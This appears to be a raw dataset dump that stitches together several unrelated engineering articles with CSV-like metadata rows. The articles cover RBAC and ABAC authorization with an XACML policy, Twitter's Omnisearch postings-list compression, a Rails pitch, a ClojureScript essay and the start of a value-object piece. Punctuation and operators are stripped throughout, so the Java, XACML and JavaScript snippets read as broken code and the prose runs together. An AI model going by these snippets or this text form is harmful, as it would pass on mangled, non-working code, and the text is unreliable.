RBAC Probably the most common variant of authorization is role based access control  RBAC   As the name implies  users are assigned roles and roles are assigned permissions  Users inherit the permission for any roles they have been assigned  Actions are validated for permissions  Perhaps you re wondering about the value of all this indirection  all you care about is that Kristen  your administrator  is able to delete users  and other users cannot  Why not just check for Kristen s username  as in the following code  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser getUsername   equals  admin_kristen      doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      What happens when user  admin_kristen  leaves your organization or changes to another role  You either have to share her credentials  which is  of course  a very bad idea  or go through the code changing all references to  admin_kristen  to the new user  A very common alternative to this is to check for the role  as in this case  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasRole Role ADMIN     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Better  but not great  We haven t tied identity to the action  but we still have a problem if we find that there are admins with lesser privileges that are allowed to add users  but not delete users  Suddenly our  admin  role isn t granular enough and we re forced to find all the  admin  checks  and  if appropriate  put an OR operation for operations allowed by both admins and our new user_creator role  As the system evolves  you end up with more and more complicated statements and an explosion in the number of roles  Users and roles will change as our software evolves  and so our solution should reflect that  Instead of hard coding user names or even role names  we ll be best served in the long term if our code validates that a particular action is allowed  This code shouldn t be concerned with who the user is  or even what roles they may or may not have  but rather whether they have the permission to do something  The mapping of identity to permission can be done upstream  public OperationResult deleteUser final UserId userId  final User callingUser    if  callingUser    null    callingUser hasPermission Permission DELETE_USER     doDelete userId   return SUCCESS    else   return PERMISSION_DENIED      Our structure is much better now because we ve made the choice to explicitly decouple permissions from roles  Yes  there is some complexity that comes with the extra step needed to map users to permissions  but generally speaking you can take advantage of frameworks like Spring Security or CanCanCan to do the heavy lifting  Consider RBAC when  Permissions are relatively static  Roles in your policies actually map reasonably to roles within your domain  rather than feeling like contrived aggregations of permissions  There isn t a terribly large number of permutations of permission  and therefore roles that will have to be maintained  You have no compelling reason to use one of the other options  Implementing ABAC If your application has more advanced needs than you can reasonably implement with RBAC  you may want to look at attribute based access control  ABAC   Attribute based access control can be thought of as a generalization of RBAC that extends to any attribute of the user  the environment in which the user exists  or the resource being accessed  With ABAC  instead of making access control decisions based on just whether the user has a role assigned  the logic can come from any property of the user s profile such as their position as defined by HR  the amount of time they have worked at the company  or the the country of their IP address  In addition  ABAC can draw on global attributes like the time of day or whether it s a national holiday in the user s locale  The most common standarized means of expressing ABAC policy is XACML  an XML based format from Oasis  This example demonstrates how one might write a rule that allows users to read if they are in a particular department at a particular time of day   Policy PolicyId  ExamplePolicy  RuleCombiningAlgId  urn oasis names tc xacml 1 0 rule combining algorithm permit overrides    Target   Subjects   AnySubject     Subjects   Resources   Resource   ResourceMatch MatchId  urn oasis names tc xacml 1 0 function anyURI equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema anyURI  http   example com resources 1  AttributeValue   ResourceAttributeDesignator DataType  http   www w3 org 2001 XMLSchema anyURI  AttributeId  urn oasis names tc xacml 1 0 resource resource id       ResourceMatch    Resource    Resources   Actions   AnyAction      Actions    Target   Rule RuleId  ReadRule  Effect  Permit    Target   Subjects   AnySubject     Subjects   Resources   AnyResource     Resources   Actions   Action   ActionMatch MatchId  urn oasis names tc xacml 1 0 function string equal    AttributeValue DataType  http   www w3 org 2001 XMLSchema string  read  AttributeValue   ActionAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  urn oasis names tc xacml 1 0 action action id      ActionMatch    Action    Actions    Target   Condition FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function string equal    Apply FunctionId  urn oasis names tc xacml 1 0 function string one and only    SubjectAttributeDesignator DataType  http   www w3 org 2001 XMLSchema string  AttributeId  department      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema string  development  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function and    Apply FunctionId  urn oasis names tc xacml 1 0 function time greater than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time      Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  09 00 00  AttributeValue    Apply   Apply FunctionId  urn oasis names tc xacml 1 0 function time less than or equal    Apply FunctionId  urn oasis names tc xacml 1 0 function time one and only    EnvironmentAttributeSelector DataType  http   www w3 org 2001 XMLSchema time  AttributeId  urn oasis names tc xacml 1 0 environment current time       Apply   AttributeValue DataType  http   www w3 org 2001 XMLSchema time  17 00 00  AttributeValue    Apply    Apply    Condition    Rule   Rule RuleId  Deny  Effect  Deny      Policy  It s worth mentioning that XACML has its challenges  It is certainly verbose and arguably cryptic  It s also one of the few options you have if you want to use a standardized model for defining ABAC policies  Another option is to build policies in the language of your application  bound to its domain  Below is an example of the same policy written in JavaScript declarative style supported by a small DSL  allow  read    of anyResource     if and  User department   is equalTo  development     timeOfDay   isDuring  9 00 PST    17 00 PST       There s considerable work to do here in addition to the defining of the policy itself that is beyond the scope of this article  To get a flavor for how something like this might be implemented  you can take a look at the repository for the DSL implementation that supports the example policy  Should you choose the path of using custom code  you will need to think about how much investment you are willing to make in the DSL itself and who owns the implementation  If you expect to have a large number of highly dynamic policies  a more sophisticated DSL might be worthwhile  An external DSL might be justified for cases in which non programmers need to understand the policies  Otherwise  for cases of more limited scope and static policies  it s best to start simple with the goal of making the policies clear to their primary maintainers  the programmers  and letting the DSL evolve over the lifecycle of the project  always taking care that changes to the DSL do not break existing policy implementations  Creating in a DSL is not a must  You can use the same object oriented  functional  or procedural coding style the rest of your application uses  and rely on strong design and refactoring practices to create clean code  The repo also includes an example with the same rules using a imperative  rather than declarative  approach  Consider ABAC when  Permissions are highly dynamic and simply changing user roles is going to be a significant maintenance headache  The profile attributes on which permissions depend are already maintained for other purposes  such as managing an employee s HR profile  Access control is sufficiently sensitive that control flows need to vary based on temporal attributes such as whether it s during the normal working hours of your employees  You wish to have centralized policy with very fine grained permissions  managed independently of your application code  Other Ways to Model Policy The above are just two possible ways of modeling policy and will probably accommodate most situations  Although they are probably rare  situations do arise that don t fit well into RBAC or ABAC  Other approaches include  Mandatory access control  MAC   centrally managed non overridable policy based on subject and resource security attributes  such as Linux  LSM  Relationship based Access Control  ReBAC   policy that is largely determined by relationship between principals and resources  Discretionary Access Control  DAC   policy approach that includes owner managed permission control  as well as systems with transferable tokens of authority  Rule based Access Control  dynamic role or permission assignment based on a set of operator programmed rules There is not universal agreement on when these approaches apply or even exactly how to define them  There is substantial overlap in the types of policies they allow operators to define  Before going down the path of choose a more esoteric approach  or inventing your own  be sure that RBAC or ABAC aren t reasonable approaches to modeling your policies  Implementation Considerations Finally  here are a few words of advice to consider when implementing authorization in your application  Browser caches can really mess with your authorization model when users share browsers  Make sure that you set the Cache Control header to  private  no cache  no store  for resources so that your server side authorization code is called every time   You will inevitably have to make a decision whether to use a declarative or imperative approach to validation logic  There is no right or wrong here  but you will want to consider what provides the most clarity  Declarative mechanisms like the annotations that Spring Security provides can be concise and elegant  but if the authorization flow is complicated  the built in expression language becomes convoluted and  arguably  you re better off writing well factored code   Try to find a solution  whether custom or framework based  that consolidates and reduces duplication of authorization logic  If you find your authorization code is scattered arbitrarily throughout your codebase  you are going to have a very hard time maintaining it  and that leads to security bugs  In Summary Authorization must always be checked on the server  Hiding user interface components is fine for user experience  but not an adequate security measure  Deny by default  Positive validation is safer and less error prone than negative validation  Code should authorize against specific resources such as files  profiles  or REST endpoints  Authorization is domain specific  but there are some common patterns to consider when designing your permission model  Stick to common patterns and frameworks unless you have a very compelling reason not to  Use RBAC for basic cases and keep permissions and roles decoupled to allow your policies to evolve  For more complicated scenarios  consider ABAC  and use XACML or policies coded in the application s language  This article is an Evolving Publication  Our intention is to continue to describe basic techniques that developers could  and should  use to reduce the chances of a security breach  To find out when we expand the article  follow the site s RSS feed or Martin s twitter feed  We ll also announce updates on our twitter feeds  Cade Cairns and Daniel Somerfield,"[400 629 28 45 444 1395 1001 329 454 1267 248]"
726,training-dataset/engineering/31.txt,engineering,Omnisearch Index FormatsOne critical feature of Omnisearch  Twitter s new information retrieval system  is flexibility  In addition to Tweets  we want to be able to index any interesting content at Twitter that could be used to build a new product  Before Omnisearch  our search infrastructure was highly customized for Tweets  In this post  we discuss how we have evolved our search technology to accommodate diverse document types  i e  content in addition to Tweets   the surprising performance impact of these changes  and how we are using this improved technology to power Twitter s latest product efforts   Data Structures for Information Retrieval  Earlybird is the indexing technology at the core of Omnisearch  To understand what it does and how we have improved it  we must first review the two most important data structures in search engines  the inverted index and the postings list  Imagine we have a collection of Tweets  each with an ID and some text that we want to search  only 3 Tweets are shown    A forward index on these Tweets would allow you to efficiently look up Tweet text by ID  This is the kind of index commonly added to database tables  In contrast  an inverted index would allow you to efficiently look up a list of Tweet IDs by a term in their text  We call the lists of IDs postings lists  and each ID added to a list is a posting   Given an inverted index  we can execute search queries by taking the union and or intersection of postings lists  scoring the resulting candidate documents  and returning the best ones  For phrase queries  term position matters too  For example  the query  say I  would match Tweet 1 but not Tweet 2  Even though both Tweet 1 and Tweet 2 contain both words   say  and  I  only appear next to each other in Tweet 1  To execute phrase queries  we store term position information with each posting  shown here in parentheses  0 indexed    There are a few important things to consider when building inverted indexes   Postings lists can be extremely long  compact storage of postings is important  K way list intersection and union algorithms are the  inner loop  of the search query  they must be implemented efficiently  Earlybird s Original Postings List Format  Earlybird has two custom postings list formats  an  active  postings list and an  optimized  postings list  The inverted index composed of active postings lists handles concurrent reads and writes using a single writer  multi reader lock free data structure and algorithm  This allows us to achieve low latency writes and high throughput reads simultaneously   a key feature for a true real time search engine  After the active list gets to some size  typically 8M documents   we optimize it into a read only format to reduce size and query cost  allowing us to store and search more documents on a single machine   For the remainder of this blog post  we focus on the read only  optimized postings list format  To learn more about the active postings list format  see Earlybird  Real Time Search at Twitter   Delta Compression and Bit Packing  In the original optimized postings list format  postings were stored in blocks of 64 integers  with each posting using the minimum number of bits possible to express the Tweet ID and the position  Consider the Tweet ID   position pairs from the postings list for  i  in the above example   Outside of our search index  Tweet IDs are stored in 64 bit integers to accommodate both the large numbers of Tweets  hundreds of billions  and to allow us to create unique Tweet IDs with minimal coordination  However  inside the index  using 64 bits of storage per posting would be prohibitively expensive  To compress Tweet IDs  we first mapped the full 64 bit ID into a 0 indexed local ID   With this alone  we would have needed significantly fewer than 64 bits to represent the local IDs  However  with delta compression  were able to save even more space  To delta compress the list  we replaced each local ID with the difference between itself and the previous local ID   Notice the delta between the last two postings is 25  which is smaller than 50 and requires fewer bits to store  The binary representation of 50 uses 6 bits  110010  while the binary representation of 25 uses only 5 bits  11001   In a postings list for a common term  which could have millions of postings   the deltas tend to stay small while the local Tweet IDs monotonically increase  making this a powerful space saving technique   Instead of using a variable byte encoding for the deltas  e g  Lucene s VInt encoding   we calculated the minimum number of bits needed to store any delta and position in the list   In our example  the minimum number of bits needed to represent a delta in this list is 5  while the minimum number of bits required to represent a position is 3  Hence  we would need 8 bits for each delta position pair   Finally  we bit packed the postings together for very efficient storage   A naive  uncompressed representation would likely use a 64 bit long for the Tweet ID and a 32 bit integer for the position  requiring 384 bits of memory to store the first four postings in our example  In contrast  the above representation would fit the first four postings into 32 bits  a 92  savings   Block Based Postings List Storage  For storage of postings  the original implementation divided memory into blocks of 64 32 bit integers  2 Kbit blocks   For long postings lists  we used many such blocks  This gave us good cache locality when scanning through postings lists  which is required for union and intersection algorithms   From the above example  the first block of the postings list for the term  i  would look like   The calculated number of bits required for a delta position pair only applies to one 2 Kbit postings block  meaning each block must be encoded and decoded independently  To decode a block  we needed to remember   The number of bits used for the delta  stored in 8 bits   The number of bits used for position  stored in 8 bits   The number of postings in the block  stored in 16 bits   In our example above  we used 5  101b  bits for delta  so we could store 11001b   3  11b  bits for position  so we could store 101b   and indexed 4  100b  postings  Packing this information into 32 bits gives   00000101 00000011 0000000000000100  We also had an optimization for efficiently skipping through long lists  for each block of postings  we used 32 bits to store the uncompressed last document ID of the previous block  This allowed us to decode only the blocks that might have hits  For the first block  we used 0 as the last document ID  Thus  each postings block required two 32 bit integers to hold its metadata  Metadata was also stored in blocks of 64 32 bit integers  The metadata block for the above example would look like this   Finally  in order to decode the entire postings list  we needed to store the number of metadata blocks in a header  In our original format  a complete postings list looked like this   Decoding Algorithms  In addition to compact storage  efficient decoding is critical to an effective postings list implementation  Decoding the block based format required extracting bit packed postings from arrays of 32 bit integers  Typically  this is done via a sequence of shift and mask operations  which together extract the desired packed value from the array  Take for example the postings list for the term  i   which was packed using 3 bits for delta and 5 bits for position  8 bits per posting    To extract the 1st posting  0  5   we would   Shift the lower order 8 bits off of the 0th integer in the array  removing the 0th posting  Mask off the lower order 3 bits  extracting the delta  Shift off lower order 3 bits  removing the delta  Mask off the lower order 5 bits  extracting the position  In this example  we only had to look up one integer from memory and perform four bitwise logical operations on it  which are typically quite efficient  However  if the desired posting spanned two packed integers  we would have to look up both integers and combine the two components of the posting  using additional memory and logical operations  Also  notice that we assumed knowledge of which integer s  the desired posting was located in  how many bits to shift by  and which masks to use  In reality  these things depend on how the block was encoded and which posting we want to decode   To improve the efficiency of the decoding algorithm  we started with the following observations   Delta values were limited to 24 bits and position values to 8 bits  32 bits maximum   Regardless of position in the bit packed array  no posting could span more than two integers  The number bits used for any posting is finite  between 1 and 32 bits   The number of integers in a block is also fixed  64   From this  we can see that the number of masks and shifts needed to extract any value from the bit packed array is finite  In our implementation  we pre computed all possible shifts and masks and looked them up at decoding time  reducing the computation required for decoding and improving overall efficiency   Original Postings List Format Performance  When compared to our active postings list format  which allows for concurrent reads and writes   we measured the above optimizations to save 55  of the memory and decrease query latency by about 50   The below graph shows a single machine using the optimized format  light blue line  running concurrently with several other machines using the active format  When we shipped this in 2012  we were able to increase our index depth by 2 4x without additional hardware  dramatically increasing the coverage of Twitter s search product   Limitations of the Original Postings List Format  In our original implementation  we chose to store the header  metadata blocks and postings blocks contiguously in memory  However  due to the variable number of postings that fit in a block  we could not predict ahead of time how many blocks a postings a list would require  Our solution was to pre allocate a worst case number of metadata blocks  To figure out how many metadata blocks we might need in the worst case  we assumed no more than 8 bits for a position and no more than 24 bits for a delta  In addition to wasting space in every postings list for unused metadata blocks  this decision introduced two limitations   At most 256 positions per document  At most 16 777 216 documents in an index  At the time  these tradeoffs were reasonable because   The cumulative size of the postings blocks was far greater than the size of the metadata blocks  We only used this format for longer postings lists  e g   common terms   Tweets are short and have fewer than 256 positions  The document partitioning scheme we were using was compatible with small indexes  For Omnisearch  these limitations are no longer tenable because we want to be able to index any interesting document at Twitter   Another issue with this format arises when we decode a postings list at query time  In order to implement Lucene s postings list iterator interface  our postings lists must be able to return the number of times a term appears in a document  to support the freq   method   Our original postings list format did not store this count directly  Instead  we scanned ahead in the list and counted the number of postings from the same document  Because Tweets are short  there are few duplicate terms in each document  and this approach was relatively efficient   New Optimized Postings List Format    Our new optimized postings list format solves the above problems by storing postings  positions  and metadata in separate lists   Postings Blocks  For postings  we continue to use delta compression  bit packing and blocks of 64 integers  However  instead of storing delta position pairs  we now store delta count pairs  That is  if the same term appears 5 times in the document with ID 100  we store only one posting   100  5   From the above example  after computing deltas  we had   Recall that the first two postings were from the same document  101   In our new format  we collapse them into one posting  replacing positions with counts   This saves on storage and allows us to efficiently implement the freq   method in Lucene s postings list iterator interface when we index longer documents  As a further optimization  since counts are at least 1 and often exactly 1  we store  count   1  instead of count   Notice that in this example  the minimum number of bits required to store a count drops from 2 to 1 per posting when we store  count   1   Even better  if all counts are 1  we will actually use 0 bits per posting  The bit packing and block based storage steps are unchanged from the original format   Positions Blocks  Without positional information the postings lists  we must store the positions somewhere else  For this  we have created a separate bit packed  block based list of positions  From our example  we take the original positions and calculate the minimum number of bits required to store them   We then encode the positions using the minimum number of bits required and bit pack them   To decode a block of positions  we need to know the number of bits we used for position and the number of positions in the block  We store this in the first 32 bit integer of the block  using 5 bits for  bits per position  and 11 bits for  number of positions   the remainder of the first 32 bit integer is unused   In our example  we need 3 bits per position and have 4 positions  so the header would be   00011 00000000100 0000000000000000  And the first block of the positions list would look like   Despite the potentially larger number of bits used per posting or position in these bit packed data structures  the number of bits for any value is still finite and we continue to exploit lookup tables for efficient decoding   Metadata  Finally  we store metadata separately from the postings and positions  with one metadata entry for every postings block  This eliminates the need to pre allocate a worst case number of metadata blocks for a postings list  Similar to the old format  for each postings block we store the following metadata   The last ID from the previous block  for skipping   The number of bits for the delta in each posting  The number of bits for the count in each posting  The number of postings in the block  Additionally  we need a way to find the positional information for the postings block when needed  For this  we store the index of the position block and the offset into it   To decode the metadata list  it has a header that includes   The number of postings blocks  equal to the number of metadata entries   A pointer to the postings blocks  A pointer to the positions blocks  These changes eliminate the overhead of wasted metadata blocks and the limitations on position and list length  Assuming there are n blocks of postings lists  the metadata list would look like   Together  the three data structures described above form a single postings list for a single term in our new optimized format   New Postings List Format Performance  With the improved flexibility of the new postings list format  we expected to sacrifice either latency or storage  However  instead of seeing a performance penalty  we found that the new format was about 2  more space efficient and 3  faster  In the graph below  the yellow line shows the average latency across Earlybird machines running the old postings list format and the blue line shows a canary host in the same cluster running with the new format    ShipIt  As a result of this work  we are now able to store larger documents in our realtime indexes without recall issues or negative performance impact  A related product improvement recently shipped  wherein we no longer count media attachments  like photos  GIFs  videos  and polls  against the 140 character limit  In the future  we will be able to use the same technology to index other types of documents  allowing us to fulfill our ultimate vision  to provide search as a service  allowing us to build entirely new kinds of products   Acknowledgements  The primary contributors to this work were Yan Zhao   zhaoyan1117   Paul Burstein   pasha407   Yi Zhuang   yz   and Michael Busch   michibusch   Other contributors included Dumitru Daniliuc   twdumi   Bogdan Gaza   hurrycane   Jane Wang   jane12345689   Wei Li   alexweili   Patrick Lok   plok   Lei Wang   wonlay   Stephen Bezek   SteveBezek   Sergey Serebryakov   megaserg   Joseph Barker   seph_barker   Maer Melo   maerdot   Mark Sparhawk   sparhawk   and Sam Luckenbill   sam,"[726 400 629 28 270 444 1127 248 996 1175 599]"
755,training-dataset/engineering/1139.txt,engineering,David Heinemeier Hansson s answer to What makes Rails a framework worth learning in 2017 The same reasons why it was a framework worth learning in 2004  The more things change  the more they stay the same  While we ve seen a lot a progress in the JavaScript world  we ve also seen a regression to the complexity laden world that Rails offered refuge from in the early days   Back then the complexity merchant of choice was J2EE  but the complaints are uncannily similar to those leveled against JavaScript today  That people spent hours  if not days  just setting up the skeletons  The basic build configurations  Assembling and cherry picking from lots of little libraries and frameworks to put together their own snowflake house variety   The core premise of Rails remains in many ways as controversial today as it was when it premiered  That by formalizing conventions  eliminating valueless choices  and offering a full stack framework that provides great defaults for anyone who wants to create a complete application  we can make dramatic strides of productivity   It s somewhat surprising to me that despite the astounding success of Rails  that there haven t been more competition for this proposition  The vast majority of activity today is for yet another option on the a la carte menu  Yet another build system  yet another view library  yet another ORM  Very little activity in integrated solutions   I guess the answer is that the foundational proposition of Rails continues to cut against the psychological grain of most programmers  That by reducing choices and accepting community conventions and answers to most of the basic questions in web development  you end up better off  Less unique  less tailored  but in ways that just don t matter anyway   Anyway  that s the big ideological appeal of Rails  I ve elaborated further on convention over configuration  the a la carte omakase conflict  the appeal of integrated systems  and other core values of the Rails community in The Rails Doctrine   After reading that  you ll probably have a pretty good idea as whether Rails is something for you or not  If you can t recognize any of the struggles outlined in that document  or you just don t like the solutions presented to those struggles  the particulars of Rails technology probably doesn t matter much  If that document resonates  or at least piques your interest  read on   On top of these ideological choices  we ve built an incredibly pragmatic and multi paradigm web framework  When people hear  web framework   they sometimes thinks that  oh  that s just some stuff to generate HTML  right    And in that definition  some might see it as though Rails competes against something like React  And I suppose it does  but in a very remote way that isn t very useful to thinking about whether Rails is right for you or not   As I talked about above  Rails has an incredibly ambitious mission  In the full stack goal lies a pursuit to deal with just about every piece of code needed to connect databases and no sql stores to a business domain model written in Ruby to a set of controllers that expose that model via REST and then  yes  finally to HTML  But that last step is a small minority of the code and focus of Rails   So if you think that client side MVC  React  Angular  or whatever is The Future  then you re still squarely in the target audience for using Rails  Because the bits you use to design your HTML JavaScript based UI still needs to connect to a back end domain model that saves stuff to the databases  computes things  enqueues jobs for later processing  sends out emails  triggers push notifications  and all the other stuff that real apps need to do   And that s where the meat of Rails sits  In what happens once that POST or PUT or GET is triggered  Now  as I said  Rails is full stack by default  So of course we also include answers for how to generate and update HTML  We have some phenomenally productive answers in Turbolinks and SJR  but even if that path doesn t appeal  everything that leads up to generating that JSON is still stuff we ll have in common   Anyway  That s a very long pitch for two basic tenets of Rails appeal in 2017  1  We have a unique ideological foundation that s still controversial today and offers the same benefits against the mainstream choices as it did 13 years ago  2  We have a pragmatic  full stack answer that could be formulated based on that ideology that still offers amazing productivity from the second you run the rails new command   Oh  and on top of all that  I ve saved the cherry for last  You get to use Ruby  which  even in a world that has rediscovered the benefits of functional programming and immutability  remains the most extraordinarily beautiful and luxurious language I ve yet to encounter  Just look at some code  I dare you not to fall in love,"[755 1305 1144 400 629 28 820 248 444 1001 1344]"
820,training-dataset/engineering/410.txt,engineering,How JavaScript Fatigue simplifies coding and increases revenueHow JavaScript Fatigue simplifies coding and increases revenue  We ve been here before  Procedural programming and goto statements was all the rage with BASIC and Fortan  Why the hell should any stop using a perfectly good tool for some new hot fad called OOP   Transitions this big are hard  Transitioning to OOP has enabled us to build amazing products that would have been extremely challenging without it  Switching core fundamentals requires unlearning the old ways to give the breathing room vet how new ideas play out in the real world  The transition to get past JavaScript Fatigue is particularly hard because the new tools push against the norms of OOP and MVC   But no one stopped to explain why  Why would your life as a developer be better  Why will your company benefit   The last two years I ve released apps using this new stack  They ve help me in ways I never could with MVC   OOP  I worry less about breakages because I have less breakages  I spend less time managing test frameworks and more time on enabling and iterating on features to make my app more useful  It s allowed me to empower designers and research teams to learn and iterate our product faster  The business gains more customers and learns quicker about their customers  Let s break down the 4 most important tools and why they each make development easier and improve your company s bottom line   1  React  The most critical piece of new architecture is React  React improves so many issues with traditional UI development it s hard to be succinct about it s benefits  The crux of React s benefit is that it uses pure functions for rendering UI in a component architecture   Purely functional views allows React to separate business logic from UI  The problem with building a stable front end application are the users  Users do random things in random order  They don t understand the UI  The way to save user is to isolate them from the business logic code  React does this by making the entire UI is only a simple reflection of the underlaying static data    d  V  Using pure functions for the view means that given any static JSON it will always render exactly the same way   The separation of business logic and UI in React makes code bases easier to grok  Collections of complex classes with multiple abstracts turn into just very basic functions in React  The last enterprise React app I build we had a new jr  developer add a new feature  by himself  on the first day and shipped it the second day  Building front end apps isn t as hard as we all thought  we just had over complicated tools   Everything has tradeoffs to consider  React is no different  It can be a struggle with existing imperative  mutable based frameworks  There are migrations paths like using React for a section of an existing app or wrapping the older app inside a React component in order to opt out of DOM management  Lastly if the development team doesn t see flaws in the existing complex OOP MVC frameworks it will be a hard sell  React works best when you go all in   2  Webpack  Webpack enables vast improvements in the developer experience while also providing massive improvements in the user experience  Webpack with Babel can be a pain to setup and configure but there s 2 very good reason why Webpack is critical   Webpack s biggest feature for development is live coding  Live coding is nothing like live reload  If you ve ever used a compiled language like Java or C versus using an intercepted language like JavaScript you ve experienced the difference  Live coding makes typing in the editor and seeing the result instant and effortless  It almost feels like a burden to have to open Chrome DevTools or alt tab to the browser and click around  It s faster to just change a line of code and see the instant result in the browser   As much Webpack improves the developer experience the bigger impact is for the end user and it will increase your company s revenue  Google  Microsoft  Walmart and Amazon all have case studies showing that improving page load speed by even 1 second increased their conversion rates and revenue by 2 to 4   In Walmart s case that s  240 millions dollars they would be leaving on the table  Webpack can massively improve page load with just a couple settings  Between code splitting and using responsive image  with the resize image loader  we cut page load time from 20 seconds to 2 seconds   3  Redux  Redux is a state management tool built on functional programming paradigms  It s a godsend for reducing bugs and reducing wasted hours attempting to repo bugs  The reason why Redux does this is because it strictly controls dependencies  Normally dependencies are thought of as the imports  But a more complete view includes anything that can implicitly mutate state  This would include Class that reference this  objects outside of the local scope  or even creating an object and returning it that someone who is able to can change its state  Simplification and an peace of mind comes from better limits on mutations  Redux uses static data and pure functions that are easier to unit test  lessens the need for mocks and delivers a higher level of guarantee against breakage   Static data provides us a serializable snapshot of the entire application at any point in time  This lets Redux to record and later replay every bug that happens in production  Stack tracks and a QA s reproduction steps leave a lot out of how to find the cause of a bug  the app s state  Fixing a bug in Redux only requires the developer to download the user s state  replay and rewind to inspect all the state transitions to see the cause of the bug   The tradeoff with Redux is that it is a very prescriptive way to model business logic  These patterns aren t always straight forward or practical especially for async  reconciling offline and online  and transparently getting data to from web services  There are other tools and plugins to help each of these issues  Redux requires a rewrite of your codebase but delivers some huge benefits   4  ClojureScript  ClojureScript might be the last core tool in the list is also the most powerful one  ClojureScript reduces the fragility that many developers assume is inherent with coding  My primary advice when starting ClojureScript is to hold off all judgement until you ve had some solid time with it  The common response I hear to ClojureScript is  I don t like your face syntax   There are really powerful reasons for it s syntax over dot notation if given a chance  Clojure has been around for 10 years  The tooling  language  community is extremely mature  ClojureScript s combination of great tooling  better core primitives  async patterns and it s improvements on static typing make it excel over other options   Immutable   All the primitives in ClojureScript can not be changed  ever  Mutations cause bug so ClojureScript is immutable by default  Immutable data makes it hard to inadvertently have a bug in one part of the code base affect things elsewhere  The normal push back is that immutable data wastes a lot of memory and is slow  In ClojureScript  it s faster and uses memory better than most mutable data usage patterns   Better core primitives offer different performance characteristics  Resist the urge to micro optimize everything because it s not like OOP   Refactorablity and Readability   The best feature is refactorablity and readability  Functional programing optimizes for improving developer effectiveness  The learning curve is high but the rewards are even higher  In only 3 weeks I went from not knowing a lick of ClojureScript to having a production ready app  The most amazing thing about ClojureScript codebases is that when I go back to it months later I can still read it  Even more astonishingly  I don t have the dying urge to refactor old code  Typical refactoring in ClojureScript is very simple compared to OOP refactors  Most of my refactors are just moving functions to other files or separating the data structure from transforming data  Clojure codebases I ve worked on are clear  declarative and concise  They rarely require jumping around to understand the data flow   Types   Static typing is not a goal  The goal is to have better error handling while writing  compiling and running your code  ClojureScript one ups static typing systems with Spec  Spec  does more than types by looking at the entire issue of data validation  Flow or TypeScript only gives compile time checking  The minute you hit a web service or access a JS lib that you didn t create you can t guarantee types  Spec are a uniform way to handle compile time type checking  run time data validation  run time asserting  and handle hard and soft errors  It can also create stub data for your tests  write your tests for you and even when a test breaks tell you exactly where and why it broke in your code  Yes  you read that right  Spec will generate your tests for you  It also will test conditions that you never considered before  After using Spec other testing practices feel like building sand castles  they takes longer to maintain with poorer results   Async   ClojureScript async is joy to behold  Promises aren t practical for all types of asynchronous work  ClojureScript core async is like the green warp tubes in Super Mario Bros  In Super Mario Brothers  one green warp tube can send Mario anywhere else in the level  world or game  This is what ClojureScript s channels do for your code base s async work  It uses Go Lang style channels that can be created in one place and easily shared in any other arbitrary place in the code base  It gives you all the benefits of Rx without any of the complicated function coupling and stream merging problems  Channels makes async code read like linear code which reduces the reader s cognitive overload so there s less complex abstracts to stumble over  With all those amazing features ClojureScript also one ups Go Lang channels by adding transducers on channels   Transducers   It s a big word but they are basically just a function with one argument   user     user firstName could be used as a transducer  Transducers use simple  agnostic functions to handle multiple transforms in a highly performant manner  Using agnostic functions means reusability is much higher  Anyone who resonates with DRY methodology  Don t Repeat Yourself  will love transducers   To understand Transducers better let s take a second and go back to the Super Mario analogy for channels  In the game we have a function when Mario touches a fire flower he turns into Fire Mario  We can put that same function on a green warp tube  channel  and when Mario come out of the tube he ll be Fire Mario  It s the same function but used in a different context  We can also have another place in the code base add a super Tanooki transducer to the same  channel  and Mario will come out as Fire Tanooki Mario  Pump all of Mario s friends through the channel and they get the same transforms with just simple  agnostic functions   If you ve read this far the only thing left is it to take 5 minutes to try out ClojureScript for yourself  One command  see below  will install everything you need to start live coding ClojureScript with the Atom editor  After you ve seen how great ClojureScript tooling is  check out Reagent s intro to ClojureScript and Andrew s tutorial series to go from JS to ClojureScript  If you have any questions check out the Clojurian Slack channel or message me on Twitter  puppybits   ClojureScript setup in one command  apm install parinfer       brew cask install java       brew install leiningen       lein new figwheel hello cljs      reagent       cd hello cljs       atom src hello_cljs core cljs       lein figwheel       open http   localhost 3449  Appendix  1  Walmart page load speeds improve conversations  2  Simple made Easy   Rich Hickey  3  Immutable data   David Nolen  4  Spec  Agility   Robustness  Stuart Halloway  5  Clojure Help  6  Clojure Docs  7  Intro to ClojureScript with Reagent  8  Go from JavaScript to ClojureScript  9  2 second page loads over 3G networks post  10  Pure View Functions  Thanks to Amelia Schmidt and Chris Oakman,"[820 1305 248 996 329 1267 454 444 629 400 28]"
849,training-dataset/engineering/161.txt,engineering,ValueObjecttags   When programming  I often find it s useful to represent things as a compound  A 2D coordinate consists of an x value and y value  An amount of money consists of a number and a currency  A date range consists of start and end dates  which themselves can be compounds of year  month  and day   As I do this  I run into the question of whether two compound objects are the same  If I have two point objects that both represent the Cartesian coordinates of  2 3   it makes sense to treat them as equal  Objects that are equal due to the value of their properties  in this case their x and y coordinates  are called value objects   But unless I m careful when programming  I may not get that behavior in my programs  Say I want to represent a point in JavaScript   const p1    x  2  y  3   const p2    x  2  y  3   assert p1     p2      NOT what I want  Sadly that test passes  It does so because JavaScript tests equality for js objects by looking at their references  ignoring the values they contain   In many situations using references rather than values makes sense  If I m loading and manipulating a bunch of sales orders  it makes sense to load each order into a single place  If I then need to see if the Alice s latest order is in the next delivery  I can take the memory reference  or identity  of Alice s order and see if that reference is in the list of orders in the delivery  For this test  I don t have to worry about what s in the order  Similarly I might rely on a unique order number  testing to see if Alice s order number is on the delivery list   Therefore I find it useful to think of two classes of object  value objects and reference objects  depending on how I tell them apart  1   I need to ensure that I know how I expect each object to handle equality and to program them so they behave according to my expectations  How I do that depends on the programming language I m working in   Some languages treat all compound data as values  If I make a simple compound in Clojure  it looks like this          x 2   y 3    x 2   y 3   true  That s the 